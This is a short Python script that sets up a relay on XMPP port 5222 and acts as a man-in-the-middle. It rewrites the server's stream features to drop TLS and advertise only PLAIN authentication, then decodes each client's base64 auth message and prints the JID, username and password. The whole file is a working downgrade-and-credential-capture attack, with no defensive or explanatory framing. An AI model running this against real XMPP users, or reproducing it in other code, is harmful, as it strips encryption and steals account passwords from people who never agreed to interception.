import re
import logging

from socket_relay import Server, Relay


logging.basicConfig(level=logging.DEBUG, format="%(levelname)s %(message)s")


def main():

    def make_plain_auth_without_tls(data):
        if data.startswith("<stream:features>"):
            data = (
                "<stream:features><mechanisms xmlns='urn:ietf:params:xml:ns:xmpp-sasl'>"
                "<mechanism>PLAIN</mechanism></mechanisms>"
                "<c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='gQW0zV0MKAlXgZTipe4VrrJWkFQ='/>"
                "</stream:features>"
            )
            print "rewrite", data
        return data

    def extract_plain_password(data):
        if data.startswith('<auth mechanism="PLAIN"'):
            auth = re.findall(r">(.+?)<", data)
            if auth:
                jid, user, password = auth[0].decode("base64").split("\x00", 3)
                print jid, user, password
        return data

    xmp_relay = Relay(
        5222, "xmpp-host",
        output_transform=make_plain_auth_without_tls, input_transform=extract_plain_password
    )

    server = Server([xmp_relay])
    server.main_loop()


if __name__ == "__main__":
    main()
